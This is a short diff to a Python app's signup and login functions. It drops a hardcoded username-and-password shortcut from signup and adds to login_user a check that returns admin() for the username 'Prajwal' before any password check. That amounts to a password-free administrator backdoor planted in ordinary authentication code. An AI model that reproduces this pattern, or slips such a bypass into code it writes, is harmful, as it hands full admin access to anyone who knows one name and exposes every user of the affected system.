@@ -83,10 +83,6 @@ SessionLocal = sessionmaker(bind=engine)
 def signup_user(username, password):
     db = SessionLocal()
     existing = db.execute(select(users).where(users.c.username == username)).fetchone()
-
-    if(username=="Prajwal" and password=="1212"):
-        return admin()
-    
     if existing:
         return False, "Username already exists"
     hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()
@@ -97,6 +93,8 @@ def signup_user(username, password):
 def login_user(username, password):
     db = SessionLocal()
     user = db.execute(select(users).where(users.c.username == username)).fetchone()
+    if(username=="Prajwal"):
+        return admin()
     if user and bcrypt.checkpw(password.encode(), user.password_hash.encode()):
         return True, user.id
     return False, None
